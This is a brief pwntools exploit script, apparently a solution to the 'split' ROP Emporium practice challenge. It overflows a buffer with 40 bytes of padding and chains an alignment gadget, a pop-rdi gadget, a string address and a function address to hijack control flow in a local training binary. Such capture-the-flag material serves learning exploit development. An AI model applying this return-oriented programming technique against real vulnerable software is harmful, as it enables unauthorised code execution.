from pwn import *

def main():
    chall = process("./split")
    # chall = gdb.debug("./split")

    initialJunk = b'A'*40
    stackAligner = p64(0x00400741)
    rdiGadget = p64(0x00000000004007c3)
    usefulString = p64(0x00601060)
    usefulFunc = p64(0x0040074b)
    
    completePayload = initialJunk + stackAligner + rdiGadget + usefulString + stackAligner + usefulFunc

    chall.sendlineafter(b"> ", completePayload)
    chall.interactive()

if __name__ == "__main__":
    main()

